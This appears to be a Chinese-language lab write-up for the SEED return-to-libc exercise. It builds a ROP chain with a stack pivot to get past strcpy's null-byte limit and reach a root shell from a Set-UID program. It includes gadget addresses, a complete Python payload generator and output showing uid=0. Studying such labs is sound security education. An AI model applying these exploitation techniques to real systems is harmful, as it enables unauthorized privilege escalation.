@@ -1,0 +1,146 @@
+system()函数在运行的时候，会先调用”/bin/sh”指向的程序(也就是”/bin/dash”)，再通过”/bin/dash”执行其他程序。而在Set-UID的进程中执行”/bin/dash”的时候，它会先drop掉Set-UID权限。如果使用retlibc的攻击方法，我们只能拿到一个没有root权限的shell:
+    $ ./retlib
+    Address of input[] inside main():  0xffffc050
+    Input size: 299
+    Address of buffer[] inside bof():  0xffffc020
+    Frame Pointer value inside bof():  0xffffc038
+    $ id
+    uid=1000(vam) gid=1000(vam) groups=1000(vam),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),133(docker)
+这时候应该怎么绕过呢？ Seedlab文档给出了两种思路:
+  * 把返回地址改成execv()，并设置execv的参数运行”/bin/bash -p”。使用了“-p”参数后，Set-UID权限不会被drop掉。
+  * ROP: 在调用system之前， 先控制执行流执行setuid(0)把进程的user ID设置成0，也就是变成了一个root用户的程序。执行system(“/bin/sh”)的时候，即使drop掉了Set-UID权限，也能获得root的shell。
+第一种思路是seedlab ret2lib实验的task4, 文档中有详细的教程, 这里不再赘述。  
+第二种思路通过构造ROP链攻击，文档有所提及，但没有给出简单优雅的攻击实现，所以下面分享一下我的ROP攻击的实现思路。
+###  ROP攻击方法
+首先，我们要在函数bof的栈上构造一个ROP链：
+    Higher Address
+    --------------------------    address of "/bin/sh"
+    --------------------------    exit address
+    -------------------------- (C)
+    system address
+    -------------------------- (B)
+    0
+    -------------------------- (A) Argument 1 address of setuid(): 0xffffc044
+    address of "pop xxx; ret" 
+    --------------------------    setuid address
+    -------------------------- Stack address of return address:  0xffffc03c
+    xxxx
+    -------------------------- Frame Pointer: 0xffffc038
+    xxxxx
+    xxxxx
+    .....
+    -------------------------- Address of buffer[]: 0xffffc020
+    Lower Address
+如果能把bof的栈构造成这种上图，bof返回时，会先执行setuid(0)。 setuid执行完毕后，会执行ret指令，弹出”pop xxx;
+ret”的地址，并将”pop xxx; ret”赋给eip，此时esp的地址在(A)处。执行”pop xxx”
+会弹出0，esp指向(B)；再执行ret，eip会变成system的地址，从而执行system(“/bin/sh”)。
+可是，如何寻找”pop xxx; ret”这样的代码片段呢？ 我们可以用objdump来反汇编:
+    objdump -d retlib > ass.txt
+    less ass.txt
+在ass.txt中，很容易发现各种符合我们要求的gadgets，比如：
+    Gadget A
+        1442:       5b                      pop    %ebx
+        1443:       c3                      ret
+0x1442 + retlib代码段的起始地址，就是Gadget A在程序中的地址。  
+代码段的地址可以用peda的`vmmap`命令看到:
+    gdb-peda$ vmmap
+    Start      End        Perm      Name
+    0x56555000 0x56556000 r--p      /home/vam/cs_lab1/Ret2Libc/retlib
+    0x56556000 0x56557000 r-xp      /home/vam/cs_lab1/Ret2Libc/retlib
+    0x56557000 0x56558000 r--p      /home/vam/cs_lab1/Ret2Libc/retlib
+    0x56558000 0x56559000 r--p      /home/vam/cs_lab1/Ret2Libc/retlib
+    0x56559000 0x5655a000 rw-p      /home/vam/cs_lab1/Ret2Libc/retlib
+    0xf7dcc000 0xf7de9000 r--p      /usr/lib32/libc-2.31.so
+    0xf7de9000 0xf7f41000 r-xp      /usr/lib32/libc-2.31.so
+    0xf7f41000 0xf7fb1000 r--p      /usr/lib32/libc-2.31.so
+    0xf7fb1000 0xf7fb3000 r--p      /usr/lib32/libc-2.31.so
+    0xf7fb3000 0xf7fb5000 rw-p      /usr/lib32/libc-2.31.so
+    0xf7fb5000 0xf7fb7000 rw-p      mapped
+    0xf7fc9000 0xf7fcb000 rw-p      mapped
+    0xf7fcb000 0xf7fcf000 r--p      [vvar]
+    0xf7fcf000 0xf7fd1000 r-xp      [vdso]
+    0xf7fd1000 0xf7fd2000 r--p      /usr/lib32/ld-2.31.so
+    0xf7fd2000 0xf7ff0000 r-xp      /usr/lib32/ld-2.31.so
+    0xf7ff0000 0xf7ffb000 r--p      /usr/lib32/ld-2.31.so
+    0xf7ffc000 0xf7ffd000 r--p      /usr/lib32/ld-2.31.so
+    0xf7ffd000 0xf7ffe000 rw-p      /usr/lib32/ld-2.31.so
+    0xfffdc000 0xffffe000 rw-p      [stack]
+因此，”pop %ebx; ret” 的地址为: 0x1442 + 0x56555000。
+到目前为止，一切看起来都很美好。然而，setuid的参数是0，
+它是一个int类型的整数，用字符串表示为”\x00\x00\x00\x00”，当strcpy()遇到’\x00’后，会停止拷贝。因此，我们没办法把完整的ROP链拷贝到bof函数的上面。
+如何绕过strcpy对与’\x00’的限制呢？
+一种方法是栈溢出之后，先执行read()函数，从标准输入中获取新的输入，然后写到栈上。read()没有’\x00’结束的限制，因此它可以写入任意的值。这种方法也是有问题的，由于read()函数需要给fd赋值(read(fd,
+buffer, size))，而fd是一个int类型的数字，它一般比较小，高位一定会含有’\x00’。  
+seedlab给出了另一种使用sprintf()函数的方法，但这种方法比较复杂，文档中也有提到：
+    The method is quite complicated and takes 15 pages to explain in the SEED book.
+下面介绍一种比较简洁的思路。  
+尽管ROP链不能被完整地拷贝到bof()的栈上面，但main函数的input[]中有一个备份：
+    int length = fread(input, sizeof(char), 1000, badfile);
+如果我们能把栈(也就是esp)指向input[]相应的位置，就能够顺利地执行ROP的程序流。  
+可是如何修改esp呢？我们需要在程序反汇编的结果中找另外的gadgets，利用这些gadgets的组合，来让esp指向input[]的地址。  
+我们很幸运，在反汇编的结果中，发现了这样的gadgtes:
+    Gadget B:
+    13a5: 59        pop %ecx
+    13a6: 5b        pop %ebx
+    13a7: 5d        pop %ebp
+    13a8: 8d 61 fc  lea -0x4(%ecx),%esp
+    13ab: c3        ret
+Gadget B可以先从栈上pop一个值给%ecx，然后把 %ecx – 4 赋给%esp，最后ret会从栈上取返回地址返回。而栈是被我们控制的
+。%ecx和ret的返回地址也都可以不是0，这就绕过了strcpy在’\x00’结束的限制。
+根据上面的分析，我们可以构造如下ROP链：
+    Higher Address
+    --------------------------    address of "/bin/sh"
+    --------------------------    exit address
+    --------------------------    system address
+    --------------------------(D - rop in input[])
+    0
+    --------------------------    Gadget A
+    --------------------------(C - rop in input[])
+    setuid address
+    --------------------------(B - rop in input[])
+    xxxxx 
+    --------------------------    xxxxx
+    --------------------------    new stack address in input
+    --------------------------    Gadget B
+    --------------------------(A - rop in buffer[])
+    xxxxx
+    xxxxx
+    .....
+    --------------------------    Lower Address
+栈溢出后，先执行gadget B(位置A, 在buffer的rop链中):
+  * pop %ecx 把新栈顶+4的位置给%ecx
+  * lea -0x4(%ecx),%esp 把新栈顶给%esp
+  * ret 返回到当前栈顶指向的地址(位置B, 在input的rop链中)
+之后，程序会依次执行setuid(0), Gadget A, system(“/bin/sh”), 拿到有root权限的shell。
+根据上述分析，实现攻击脚本如下：
+    #!/usr/bin/env python3
+    import sys
+    content = bytearray(0xaa for i in range(300))
+    process_code = 0x56555000
+    pop_ret_addr = 0x1442 + process_code # Gadget A
+    pop_lea_addr = 0x13a5 + process_code # Gadget B
+    system_addr = 0xf7e11420
+    exit_addr = 0xf7e03f80 
+    setuid_addr = 0xf7e98e30
+    main_buffer = 0xffffc050 
+    main_buffer_addr = main_buffer+ 0x1c + 4*5
+    pay = 0xdeedbeef
+    sh_addr = main_buffer + 0x100
+    chain = [pop_lea_addr, main_buffer_addr, pay, pay, setuid_addr, pop_ret_addr, 0, system_addr, exit_addr, sh_addr]
+    start = 0x1c
+    for i in range(len(chain)):
+        content[start+i*4: start+i*4+4] = (chain[i]).to_bytes(4,byteorder='little')
+    content[0x100:0x100+8] = b"/bin/sh\x00"
+    # Save content to a file
+    with open("badfile", "wb") as f:
+        f.write(content)
+运行脚本之后生成badfile之后，可以获得有root权限的shell:
+    $ python3 exploit.py
+    $ ./retlib
+    Address of input[] inside main():  0xffffc050
+    Input size: 300
+    Address of buffer[] inside bof():  0xffffc020
+    Frame Pointer value inside bof():  0xffffc038
+    # id
+    uid=0(root) gid=1000(vam) groups=1000(vam),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),133(docker)
+(本篇完)
